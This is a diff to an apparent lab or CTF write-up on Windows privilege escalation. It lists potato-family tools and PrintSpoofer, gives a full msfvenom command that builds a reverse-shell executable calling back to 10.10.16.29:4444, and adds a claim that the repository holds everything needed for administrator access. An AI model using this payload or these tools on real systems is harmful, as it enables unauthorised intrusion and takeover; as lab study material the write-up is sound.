@@ -40,6 +40,8 @@ From the above scenarion there many ways you can try to exploit this but actuall
 2. RoguePotato.exe
 3. JuicyPotato
 4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
+5. PrintSpoofer
+
 ```
 C:\Users\Public\desktop>dir
 dir
@@ -60,5 +62,6 @@ dir
                7 File(s)        601,801 bytes
                3 Dir(s)  13,362,515,968 bytes free
 ```
+Everything required is available here no need to search for them online anymore, just this repostory is enough to go for root/administrator
 
 
